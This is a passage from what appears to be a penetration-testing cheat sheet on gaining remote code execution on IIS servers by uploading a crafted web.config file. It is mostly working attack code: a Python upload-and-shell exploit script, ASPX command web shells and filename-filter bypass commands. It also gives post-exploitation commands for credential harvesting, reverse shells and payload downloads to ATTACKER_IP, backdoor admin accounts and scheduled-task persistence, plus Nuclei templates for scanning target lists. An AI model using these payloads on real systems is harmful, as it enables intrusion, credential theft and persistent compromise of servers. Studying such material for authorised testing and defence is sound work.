      <add name="txt_handler" path="*.txt" verb="*" type="System.Web.UI.PageHandlerFactory" resourceType="Unspecified"/>
    </handlers>
  </system.webServer>
  <system.web>
    <compilation defaultLanguage="c#" debug="true"/>
    <httpHandlers>
      <add path="*.txt" verb="*" type="System.Web.UI.PageHandlerFactory"/>
    </httpHandlers>
  </system.web>
</configuration>''',

    "gif": '''<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="gif_handler" path="*.gif" verb="*" type="System.Web.UI.PageHandlerFactory" resourceType="Unspecified"/>
    </handlers>
  </system.webServer>
  <system.web>
    <compilation defaultLanguage="c#" debug="true"/>
    <httpHandlers>
      <add path="*.gif" verb="*" type="System.Web.UI.PageHandlerFactory"/>
    </httpHandlers>
  </system.web>
</configuration>''',
}

shell_payload = '''<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
if (Request["cmd"] != null) {
  Process p = new Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.Arguments = "/c " + Request["cmd"];
  p.StartInfo.RedirectStandardOutput = true;
  p.StartInfo.UseShellExecute = false;
  p.Start();
  Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
}
%>'''

print(f"[*] Target: {target}")
print(f"[*] Testing handler mapping + shell upload chain\n")

for ext, config in handler_configs.items():
    print(f"\n{'='*50}")
    print(f"[*] Trying .{ext} handler mapping")
    
    # Upload web.config
    files = {"file": ("web.config", config, "text/xml")}
    r = requests.post(upload_url, files=files, headers=headers, verify=False, timeout=10)
    
    if r.status_code not in [200, 201]:
        print(f"  [-] web.config upload failed: HTTP {r.status_code}")
        continue
    
    print(f"  [+] web.config uploaded (HTTP {r.status_code})")
    
    # Upload shell with the mapped extension
    shell_name = f"cmd.{ext}"
    files = {"file": (shell_name, shell_payload, f"image/{ext}" if ext in ['jpg','png','gif'] else "text/plain")}
    r = requests.post(upload_url, files=files, headers=headers, verify=False, timeout=10)
    
    if r.status_code not in [200, 201]:
        print(f"  [-] Shell upload failed: HTTP {r.status_code}")
        continue
    
    print(f"  [+] {shell_name} uploaded (HTTP {r.status_code})")
    
    # Test execution
    shell_url = f"{target}{upload_dir}/{shell_name}?cmd=whoami"
    try:
        r = requests.get(shell_url, verify=False, timeout=10)
        if r.status_code == 200 and "<pre>" in r.text:
            print(f"  [!!!] RCE CONFIRMED via .{ext} handler!")
            print(f"  [!!!] Shell: {target}{upload_dir}/{shell_name}?cmd=COMMAND")
            print(f"  [!!!] Output: {r.text.strip()}")
            break
        else:
            print(f"  [-] Execution test failed (HTTP {r.status_code})")
    except Exception as e:
        print(f"  [-] Error: {e}")
```
::

### Burp Suite Method

::steps{level="4"}
#### Intercept Upload Request

```
1. Configure browser proxy to Burp (127.0.0.1:8080)
2. Navigate to upload page on target
3. Select any file for upload
4. Enable Intercept, click Upload
```

#### Modify Filename and Content

Original request:

```http
POST /upload HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: multipart/form-data; boundary=----WebKitBound

------WebKitBound
Content-Disposition: form-data; name="file"; filename="photo.jpg"
Content-Type: image/jpeg

<binary JPEG data>
------WebKitBound--
```

Modified request:

```http
POST /upload HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: multipart/form-data; boundary=----WebKitBound

------WebKitBound
Content-Disposition: form-data; name="file"; filename="web.config"
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*"
        modules="IsapiModule"
        scriptProcessor="%windir%\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll"
        resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions><remove fileExtension=".config" /></fileExtensions>
        <hiddenSegments><remove segment="web.config" /></hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
<%@ Page Language="C#" %>
<% Response.Write("<pre>" + new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd() + "</pre>"); %>
------WebKitBound--
```

#### Forward and Trigger

```bash
curl "https://target.com/uploads/web.config?cmd=whoami"
```
::

---

## Filename Filter Bypass

::caution{icon="i-lucide-triangle-alert"}
Many applications specifically block `web.config` filenames. Use these techniques to bypass the filter.
::

::tabs
  :::tabs-item{icon="i-lucide-case-sensitive" label="Case Manipulation"}
  ```bash
  # IIS is case-insensitive — all resolve to web.config
  for name in "Web.config" "WEB.CONFIG" "Web.Config" "wEb.CoNfIg" "WEB.config" "web.CONFIG" "weB.conFIG"; do
    curl -X POST https://target.com/upload \
      -F "file=@web.config;filename=${name}" \
      -s -o /dev/null -w "${name} -> HTTP %{http_code}\n"
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-type" label="Unicode Normalization"}
  ```bash
  # Fullwidth characters normalize to ASCII on NTFS
  # ｗ=U+FF57, ｅ=U+FF45, ｂ=U+FF42, etc.
  curl -X POST https://target.com/upload \
    -F "file=@web.config;filename=ｗｅｂ.config" -v

  curl -X POST https://target.com/upload \
    -F "file=@web.config;filename=web.ｃｏｎｆｉｇ" -v

  curl -X POST https://target.com/upload \
    -F "file=@web.config;filename=ｗｅｂ．ｃｏｎｆｉｇ" -v

  curl -X POST https://target.com/upload \
    -F "file=@web.config;filename=ⓦⓔⓑ.ⓒⓞⓝⓕⓘⓖ" -v
  ```
  :::

  :::tabs-item{icon="i-lucide-move-right" label="Path Traversal"}
  ```bash
  # Traverse into a different directory
  curl -X POST https://target.com/upload \
    -F "file=@web.config;filename=../web.config" -v

  curl -X POST https://target.com/upload \
    -F "file=@web.config;filename=..%2Fweb.config" -v

  curl -X POST https://target.com/upload \
    -F "file=@web.config;filename=..%5Cweb.config" -v

  curl -X POST https://target.com/upload \
    -F "file=@web.config;filename=....//web.config" -v

  curl -X POST https://target.com/upload \
    -F "file=@web.config;filename=..%255Cweb.config" -v

  # Traverse to specific application directories
  curl -X POST https://target.com/upload \
    -F "file=@web.config;filename=../../wwwroot/uploads/web.config" -v
  ```
  :::

  :::tabs-item{icon="i-lucide-binary" label="Null Byte / Trailing Characters"}
  ```bash
  # Null byte before filename
  curl -X POST https://target.com/upload \
    -F "file=@web.config;filename=web.config%00.jpg" -v

  # Trailing dot (stripped by Windows/NTFS)
  curl -X POST https://target.com/upload \
    -F "file=@web.config;filename=web.config." -v

  curl -X POST https://target.com/upload \
    -F "file=@web.config;filename=web.config..." -v

  # Trailing space (stripped by Windows/NTFS)
  curl -X POST https://target.com/upload \
    -F "file=@web.config;filename=web.config " -v

  # ADS (Alternate Data Stream)
  curl -X POST https://target.com/upload \
    -F "file=@web.config;filename=web.config::$DATA" -v
  ```
  :::

  :::tabs-item{icon="i-lucide-file-plus" label="Double Content-Disposition"}
  ```bash
  # First header has safe name, second has web.config
  curl -X POST https://target.com/upload \
    -H "Content-Type: multipart/form-data; boundary=----Bound" \
    --data-binary $'------Bound\r\nContent-Disposition: form-data; name="file"; filename="safe.jpg"\r\nContent-Disposition: form-data; name="file"; filename="web.config"\r\nContent-Type: text/xml\r\n\r\n<WEBCONFIG_PAYLOAD>\r\n------Bound--'
  ```

  ```bash
  # filename* parameter (RFC 5987)
  curl -X POST https://target.com/upload \
    -H "Content-Type: multipart/form-data; boundary=----Bound" \
    --data-binary $'------Bound\r\nContent-Disposition: form-data; name="file"; filename="safe.jpg"; filename*=UTF-8'\'''\''web.config\r\nContent-Type: text/xml\r\n\r\n<WEBCONFIG_PAYLOAD>\r\n------Bound--'
  ```
  :::

  :::tabs-item{icon="i-lucide-replace" label="Extension-Based Tricks"}
  ```bash
  # Some filters check for .config extension
  # web.config is not an extension — it's the full filename

  # If filter blocks ".config" extension
  # Try alternate config filenames that IIS also processes:
  # (These only work at the application root level typically)

  # For subdirectory override, only web.config works
  # But the filter bypass is on the NAME, not extension

  # Test if filter only checks extension
  curl -X POST https://target.com/upload \
    -F "file=@web.config;filename=web.config.jpg" -v
  # Then rename via path traversal or direct access
  ```
  :::
::

---

## Framework-Specific Variations

::accordion
  :::accordion-item{icon="i-lucide-code" label="ASP.NET Framework 4.x (Integrated Mode)"}
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers>
        <add name="aspnet_config" path="*.config" verb="*"
          type="System.Web.UI.PageHandlerFactory"
          resourceType="Unspecified"
          preCondition="integratedMode" />
      </handlers>
      <security>
        <requestFiltering>
          <fileExtensions>
            <remove fileExtension=".config" />
          </fileExtensions>
          <hiddenSegments>
            <remove segment="web.config" />
          </hiddenSegments>
        </requestFiltering>
      </security>
    </system.webServer>
  </configuration>
  <%@ Page Language="C#" %>
  <% Response.Write(System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd()); %>
  ```
  :::

  :::accordion-item{icon="i-lucide-box" label="ASP.NET Framework 4.x (Classic Mode)"}
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.web>
      <httpHandlers>
        <add verb="*" path="*.config"
          type="System.Web.UI.PageHandlerFactory" />
      </httpHandlers>
    </system.web>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="config_classic" path="*.config" verb="*"
          modules="IsapiModule"
          scriptProcessor="%windir%\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll"
          resourceType="Unspecified"
          requireAccess="Write"
          preCondition="bitness64" />
      </handlers>
      <security>
        <requestFiltering>
          <fileExtensions>
            <remove fileExtension=".config" />
          </fileExtensions>
          <hiddenSegments>
            <remove segment="web.config" />
          </hiddenSegments>
        </requestFiltering>
      </security>
      <validation validateIntegratedModeConfiguration="false" />
    </system.webServer>
  </configuration>
  <%@ Page Language="C#" %>
  <% Response.Write(System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd()); %>
  ```
  :::

  :::accordion-item{icon="i-lucide-cpu" label="ASP.NET Framework 2.0 / 3.5"}
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.web>
      <httpHandlers>
        <add verb="*" path="*.config"
          type="System.Web.UI.PageHandlerFactory" />
      </httpHandlers>
    </system.web>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="config_net2" path="*.config" verb="*"
          modules="IsapiModule"
          scriptProcessor="%windir%\Microsoft.NET\Framework64\v2.0.50727\aspnet_isapi.dll"
          resourceType="Unspecified"
          requireAccess="Write"
          preCondition="bitness64" />
      </handlers>
      <security>
        <requestFiltering>
          <fileExtensions>
            <remove fileExtension=".config" />
          </fileExtensions>
          <hiddenSegments>
            <remove segment="web.config" />
          </hiddenSegments>
        </requestFiltering>
      </security>
      <validation validateIntegratedModeConfiguration="false" />
    </system.webServer>
  </configuration>
  <%@ Page Language="C#" %>
  <% Response.Write(System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd()); %>
  ```
  :::

  :::accordion-item{icon="i-lucide-binary" label="32-bit Application Pool"}
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="config_32bit" path="*.config" verb="*"
          modules="IsapiModule"
          scriptProcessor="%windir%\Microsoft.NET\Framework\v4.0.30319\aspnet_isapi.dll"
          resourceType="Unspecified"
          requireAccess="Write"
          preCondition="bitness32" />
      </handlers>
      <security>
        <requestFiltering>
          <fileExtensions>
            <remove fileExtension=".config" />
          </fileExtensions>
          <hiddenSegments>
            <remove segment="web.config" />
          </hiddenSegments>
        </requestFiltering>
      </security>
    </system.webServer>
  </configuration>
  <%@ Page Language="C#" %>
  <% Response.Write(System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd()); %>
  ```
  :::

  :::accordion-item{icon="i-lucide-settings" label="Auto-Detect Bitness and Mode"}
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.web>
      <httpHandlers>
        <add verb="*" path="*.config"
          type="System.Web.UI.PageHandlerFactory" />
      </httpHandlers>
      <compilation defaultLanguage="c#" debug="true" />
    </system.web>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <!-- Try Integrated Mode first -->
        <add name="config_integrated" path="*.config" verb="*"
          type="System.Web.UI.PageHandlerFactory"
          resourceType="Unspecified"
          preCondition="integratedMode" />
        <!-- Fallback: Classic 64-bit -->
        <add name="config_classic64" path="*.config" verb="*"
          modules="IsapiModule"
          scriptProcessor="%windir%\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll"
          resourceType="Unspecified"
          requireAccess="Write"
          preCondition="classicMode,bitness64" />
        <!-- Fallback: Classic 32-bit -->
        <add name="config_classic32" path="*.config" verb="*"
          modules="IsapiModule"
          scriptProcessor="%windir%\Microsoft.NET\Framework\v4.0.30319\aspnet_isapi.dll"
          resourceType="Unspecified"
          requireAccess="Write"
          preCondition="classicMode,bitness32" />
      </handlers>
      <security>
        <requestFiltering>
          <fileExtensions>
            <remove fileExtension=".config" />
          </fileExtensions>
          <hiddenSegments>
            <remove segment="web.config" />
          </hiddenSegments>
        </requestFiltering>
      </security>
      <validation validateIntegratedModeConfiguration="false" />
    </system.webServer>
  </configuration>
  <%@ Page Language="C#" Debug="true" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <%
  if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.RedirectStandardError = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "\n" + p.StandardError.ReadToEnd() + "</pre>");
  } else {
    Response.Write("Ready. Use ?cmd=whoami");
  }
  %>
  ```
  :::
::

---

## Debugging Failed Exploits

::tabs
  :::tabs-item{icon="i-lucide-bug" label="Common Errors & Fixes"}
  | Error Message | Cause | Fix |
  | --- | --- | --- |
  | `500 - Internal Server Error` | Config XML syntax error or locked section | Validate XML, try different sections |
  | `404.3 - Not Found (MIME type)` | Extension not mapped to handler | Ensure handler registration is correct |
  | `500.19 - Config Error` | Section locked by parent config | Try different config sections |
  | `500.21 - Handler not recognized` | Wrong module/handler type | Match to IIS pipeline mode |
  | `403.14 - Directory listing denied` | Config loaded but handler not matching | Check path pattern in handler |
  | `Config section is locked` | `allowOverride="false"` in parent | Target unlocked sections instead |
  | Blank response | ASPX code not executing | Check handler mapping and ISAPI DLL path |
  | Config content displayed as text | Handler not registered for `.config` | Ensure both `requestFiltering` removes are present |
  :::

  :::tabs-item{icon="i-lucide-wrench" label="Diagnostic Config"}
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.web>
      <customErrors mode="Off" />
      <compilation debug="true" />
      <trace enabled="true" localOnly="false" pageOutput="true" />
    </system.web>
    <system.webServer>
      <httpErrors errorMode="Detailed" existingResponse="PassThrough" />
      <handlers accessPolicy="Read, Script, Write">
        <add name="web_config" path="*.config" verb="*"
          modules="IsapiModule"
          scriptProcessor="%windir%\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll"
          resourceType="Unspecified"
          requireAccess="Write"
          preCondition="bitness64" />
      </handlers>
      <security>
        <requestFiltering>
          <fileExtensions>
            <remove fileExtension=".config" />
          </fileExtensions>
          <hiddenSegments>
            <remove segment="web.config" />
          </hiddenSegments>
        </requestFiltering>
      </security>
    </system.webServer>
  </configuration>
  <%@ Page Language="C#" Debug="true" %>
  <%
  Response.Write("<h3>Diagnostic Info</h3>");
  Response.Write("<pre>");
  Response.Write("Server: " + Environment.MachineName + "\n");
  Response.Write("OS: " + Environment.OSVersion + "\n");
  Response.Write("CLR: " + Environment.Version + "\n");
  Response.Write("64-bit: " + Environment.Is64BitProcess + "\n");
  Response.Write("User: " + Environment.UserName + "\n");
  Response.Write("Domain: " + Environment.UserDomainName + "\n");
  Response.Write("Path: " + Request.PhysicalPath + "\n");
  Response.Write("AppPool: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name + "\n");
  Response.Write("Pipeline: " + (HttpRuntime.UsingIntegratedPipeline ? "Integrated" : "Classic") + "\n");
  Response.Write("</pre>");
  %>
  ```
  :::

  :::tabs-item{icon="i-lucide-test-tube" label="Section Lock Testing"}
  ```bash
  # Test each section individually to find which are locked
  
  # Test handlers section
  cat > test_handlers.xml << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers>
        <add name="test" path="*.test" verb="GET" type="System.Web.UI.PageHandlerFactory" resourceType="Unspecified"/>
      </handlers>
    </system.webServer>
  </configuration>
  EOF
  curl -X POST https://target.com/upload -F "file=@test_handlers.xml;filename=web.config" -v
  curl -s "https://target.com/uploads/" | head -5
  
  # Test security section
  cat > test_security.xml << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <security>
        <requestFiltering>
          <fileExtensions>
            <remove fileExtension=".config"/>
          </fileExtensions>
        </requestFiltering>
      </security>
    </system.webServer>
  </configuration>
  EOF
  curl -X POST https://target.com/upload -F "file=@test_security.xml;filename=web.config" -v
  curl -s "https://target.com/uploads/" | head -5
  
  # Test httpProtocol section
  cat > test_headers.xml << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <httpProtocol>
        <customHeaders>
          <add name="X-Test-Header" value="works"/>
        </customHeaders>
      </httpProtocol>
    </system.webServer>
  </configuration>
  EOF
  curl -X POST https://target.com/upload -F "file=@test_headers.xml;filename=web.config" -v
  curl -sI "https://target.com/uploads/" | grep "X-Test"
  ```
  :::
::

---

## Post-Exploitation

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="System Enumeration"}
  ```bash
  # Identity
  curl "https://target.com/uploads/web.config?cmd=whoami"
  curl "https://target.com/uploads/web.config?cmd=whoami+/priv"
  curl "https://target.com/uploads/web.config?cmd=whoami+/groups"
  
  # System info
  curl "https://target.com/uploads/web.config?cmd=systeminfo"
  curl "https://target.com/uploads/web.config?cmd=hostname"
  curl "https://target.com/uploads/web.config?cmd=set"
  
  # Network
  curl "https://target.com/uploads/web.config?cmd=ipconfig+/all"
  curl "https://target.com/uploads/web.config?cmd=netstat+-an"
  curl "https://target.com/uploads/web.config?cmd=arp+-a"
  curl "https://target.com/uploads/web.config?cmd=route+print"
  curl "https://target.com/uploads/web.config?cmd=net+view"
  
  # Users and groups
  curl "https://target.com/uploads/web.config?cmd=net+user"
  curl "https://target.com/uploads/web.config?cmd=net+localgroup"
  curl "https://target.com/uploads/web.config?cmd=net+localgroup+administrators"
  
  # IIS configuration
  curl "https://target.com/uploads/web.config?cmd=C:\Windows\System32\inetsrv\appcmd.exe+list+site"
  curl "https://target.com/uploads/web.config?cmd=C:\Windows\System32\inetsrv\appcmd.exe+list+app"
  curl "https://target.com/uploads/web.config?cmd=C:\Windows\System32\inetsrv\appcmd.exe+list+apppool"
  ```
  :::

  :::tabs-item{icon="i-lucide-key" label="Credential Harvesting"}
  ```bash
  # Root web.config (connection strings, keys)
  curl "https://target.com/uploads/web.config?cmd=type+C:\inetpub\wwwroot\web.config"
  
  # Machine keys
  curl "https://target.com/uploads/web.config?cmd=type+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config"
  
  # ApplicationHost.config (all site configs)
  curl "https://target.com/uploads/web.config?cmd=type+C:\Windows\System32\inetsrv\config\applicationHost.config"
  
  # Search for passwords in config files
  curl "https://target.com/uploads/web.config?cmd=findstr+/si+password+C:\inetpub\wwwroot\*.config"
  curl "https://target.com/uploads/web.config?cmd=findstr+/si+connectionString+C:\inetpub\wwwroot\*.config"
  
  # .NET user secrets
  curl "https://target.com/uploads/web.config?cmd=dir+/s+/b+C:\Users\*\AppData\Roaming\Microsoft\UserSecrets\"
  
  # Registry stored credentials
  curl "https://target.com/uploads/web.config?cmd=reg+query+HKLM\SOFTWARE\Microsoft\Windows+NT\CurrentVersion\Winlogon"
  curl "https://target.com/uploads/web.config?cmd=reg+query+HKCU\Software\SimonTatham\PuTTY\Sessions+/s"
  ```
  :::

  :::tabs-item{icon="i-lucide-radio" label="Reverse Shell"}
  ```bash
  # Start listener
  nc -lvnp 4444
  ```

  ```bash
  # PowerShell reverse shell
  curl "https://target.com/uploads/web.config?cmd=powershell+-nop+-ep+bypass+-c+\"$c=New-Object+Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%25{0};while(($i=$s.Read($b,0,$b.Length))+-ne+0){$d=(New-Object+Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex+$d+2>%261|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\""
  ```

  ```bash
  # Download and execute
  curl "https://target.com/uploads/web.config?cmd=certutil+-urlcache+-f+http://ATTACKER_IP/nc.exe+C:\Windows\Temp\nc.exe"
  curl "https://target.com/uploads/web.config?cmd=C:\Windows\Temp\nc.exe+ATTACKER_IP+4444+-e+cmd.exe"
  ```

  ```bash
  # PowerShell download cradle
  curl "https://target.com/uploads/web.config?cmd=powershell+-nop+-c+\"IEX(New-Object+Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')\""
  ```

  ```bash
  # Meterpreter via msfvenom
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o met.exe
  
  # Host and download
  python3 -m http.server 80 &
  curl "https://target.com/uploads/web.config?cmd=certutil+-urlcache+-f+http://ATTACKER_IP/met.exe+C:\Windows\Temp\met.exe+%26%26+C:\Windows\Temp\met.exe"
  ```
  :::

  :::tabs-item{icon="i-lucide-shield" label="Persistence"}
  ```bash
  # Drop additional web shell in less monitored location
  curl "https://target.com/uploads/web.config?cmd=echo+^<%25@+Page+Language=\"C#\"+%25^>^<%25+Response.Write(System.Diagnostics.Process.Start(new+System.Diagnostics.ProcessStartInfo(\"cmd.exe\",\"/c+\"+Request[\"c\"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd());+%25^>+>+C:\inetpub\wwwroot\error\500.aspx"
  ```

  ```bash
  # Create backdoor admin user
  curl "https://target.com/uploads/web.config?cmd=net+user+svc_backup+P@ssw0rd123!+/add"
  curl "https://target.com/uploads/web.config?cmd=net+localgroup+administrators+svc_backup+/add"
  ```

  ```bash
  # Enable RDP
  curl "https://target.com/uploads/web.config?cmd=reg+add+\"HKLM\System\CurrentControlSet\Control\Terminal+Server\"+/v+fDenyTSConnections+/t+REG_DWORD+/d+0+/f"
  curl "https://target.com/uploads/web.config?cmd=netsh+advfirewall+firewall+add+rule+name=\"RDP\"+dir=in+action=allow+protocol=tcp+localport=3389"
  ```

  ```bash
  # Scheduled task backdoor
  curl "https://target.com/uploads/web.config?cmd=schtasks+/create+/tn+\"WindowsUpdate\"+/tr+\"powershell+-nop+-w+hidden+-c+IEX(IWR+http://ATTACKER_IP/beacon.ps1)\"+/sc+hourly+/ru+SYSTEM"
  ```
  :::
::

---

## Nuclei Templates

::code-collapse
```yaml [webconfig-upload-rce.yaml]
id: webconfig-upload-rce

info:
  name: Web.config Upload - Remote Code Execution
  author: pentester
  severity: critical
  description: Tests for RCE via web.config upload to IIS servers
  tags: upload,iis,rce,webconfig,aspnet

variables:
  marker: "{{rand_base(8)}}"

http:
  - raw:
      - |
        POST {{BaseURL}}/upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WCBound{{marker}}

        ------WCBound{{marker}}
        Content-Disposition: form-data; name="file"; filename="web.config"
        Content-Type: text/xml

        <?xml version="1.0" encoding="UTF-8"?>
        <configuration>
          <system.webServer>
            <handlers accessPolicy="Read, Script, Write">
              <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
            </handlers>
            <security>
              <requestFiltering>
                <fileExtensions><remove fileExtension=".config" /></fileExtensions>
                <hiddenSegments><remove segment="web.config" /></hiddenSegments>
              </requestFiltering>
            </security>
          </system.webServer>
        </configuration>
        <%@ Page Language="C#" %><%Response.Write("NUCLEI_WC_{{marker}}");%>
        ------WCBound{{marker}}--

      - |
        GET {{BaseURL}}/uploads/web.config HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - "NUCLEI_WC_{{marker}}"

      - type: status
        part: header_2
        status:
          - 200

    extractors:
      - type: regex
        part: body_1
        regex:
          - "(?i)(uploaded|success|saved|path|location)[^<]*"
```

```yaml [webconfig-handler-mapping.yaml]
id: webconfig-handler-mapping

info:
  name: Web.config Handler Mapping Abuse
  author: pentester
  severity: high
  description: Tests if web.config can remap file extensions to ASP.NET handler
  tags: upload,iis,webconfig,handler

http:
  - raw:
      - |
        POST {{BaseURL}}/upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----HMBound

        ------HMBound
        Content-Disposition: form-data; name="file"; filename="web.config"
        Content-Type: text/xml

        <?xml version="1.0" encoding="UTF-8"?>
        <configuration>
          <system.webServer><handlers><add name="txt_handler" path="*.txt" verb="*" type="System.Web.UI.PageHandlerFactory" resourceType="Unspecified"/></handlers></system.webServer>
          <system.web><compilation defaultLanguage="c#" debug="true"/><httpHandlers><add path="*.txt" verb="*" type="System.Web.UI.PageHandlerFactory"/></httpHandlers></system.web>
        </configuration>
        ------HMBound
        Content-Disposition: form-data; name="file2"; filename="test.txt"
        Content-Type: text/plain

        <%@ Page Language="C#" %><%Response.Write("HANDLER_MAP_TEST");%>
        ------HMBound--

      - |
        GET {{BaseURL}}/uploads/test.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body_2
        words:
          - "HANDLER_MAP_TEST"
```
::

```bash
# Run web.config RCE template
nuclei -t webconfig-upload-rce.yaml -u https://target.com -v

# Run handler mapping template
nuclei -t webconfig-handler-mapping.yaml -u https://target.com -v

# Run against target list
nuclei -t webconfig-upload-rce.yaml -l targets.txt -c 25 -v -o results.txt

# Run with authentication
nuclei -t webconfig-upload-rce.yaml -u https://target.com \
  -H "Cookie: session=YOUR_SESSION" -v
```

---

## Request Flow Diagram

::code-preview
```
┌──────────────────────────────────────────────────────────────────┐
│                          ATTACKER                                │
│                                                                  │
│  Step 1: Upload web.config (handler mapping + inline ASPX code)  │
│  Step 2: Upload shell.jpg (ASPX code with .jpg extension)        │
│  Step 3: Request shell.jpg?cmd=whoami                            │
└─────────────────┬────────────────────────────────────────────────┘
                  │
                  ▼
┌──────────────────────────────────────────────────────────────────┐
│                    UPLOAD ENDPOINT                               │
│                                                                  │
│  1. Receives web.config → filename allowed (or bypass used)      │
│  2. Receives shell.jpg → image extension, passes filter          │
│  3. Both files saved to /uploads/ directory                      │
└─────────────────┬────────────────────────────────────────────────┘
                  │
                  ▼
┌──────────────────────────────────────────────────────────────────┐
│                     IIS + ASP.NET                                │
│                                                                  │
│  1. IIS reads /uploads/web.config on next request to /uploads/   │
│  2. web.config registers: *.jpg → PageHandlerFactory             │
│  3. Request for /uploads/shell.jpg arrives                       │
│  4. IIS routes .jpg to ASP.NET PageHandlerFactory                │
│  5. ASP.NET compiles and executes ASPX code in shell.jpg         │
│  6. Process.Start("cmd.exe", "/c whoami") runs                   │
│  7. Output returned to attacker                                  │
│                                                                  │
│  Result: REMOTE CODE EXECUTION                                   │
└──────────────────────────────────────────────────────────────────┘
```

#code
```
web.config → Maps .jpg to ASP.NET handler
shell.jpg  → Contains ASPX code
Request    → GET /uploads/shell.jpg?cmd=whoami
IIS        → Processes .jpg as ASP.NET page → EXECUTES CODE
```
::

---

## Configuration Section Reference

::collapsible

| Section Path | Purpose | Commonly Locked? | Exploit Use |
| --- | --- | --- | --- |
| `system.webServer/handlers` | Register HTTP request handlers | Sometimes | Map extensions to ASP.NET for RCE |
| `system.webServer/security/requestFiltering` | Control allowed/blocked extensions | Sometimes | Remove `.config` blocking |
| `system.webServer/staticContent` | MIME type mappings | Rarely | Serve executables, enable SVG XSS |
| `system.webServer/httpProtocol/customHeaders` | Response headers | Rarely | Remove security headers, CORS bypass |
| `system.webServer/directoryBrowse` | Directory listing | Rarely | Enumerate files in upload directory |
| `system.webServer/httpRedirect` | URL redirects | Rarely | Phishing redirects |
| `system.webServer/httpErrors` | Error page configuration | Sometimes | Information disclosure |
| `system.webServer/security/ipSecurity` | IP restrictions | Sometimes | Bypass IP whitelists |
| `system.webServer/security/authentication` | Auth providers | Often | Disable authentication |
| `system.web/httpHandlers` | Classic mode handlers | Rarely | Map extensions (Classic pipeline) |
| `system.web/compilation` | Compilation settings | Rarely | Enable debug mode |
| `system.web/customErrors` | Error display | Rarely | Show detailed errors |
| `system.web/trace` | Request tracing | Rarely | Expose request data |
| `system.web/authentication` | Auth mode | Often | Disable authentication |
| `system.web/authorization` | Access rules | Sometimes | Allow anonymous access |
| `system.web/machineKey` | Crypto keys | Often | ViewState deserialization attacks |

::

---

## Resources & Reference

::card-group
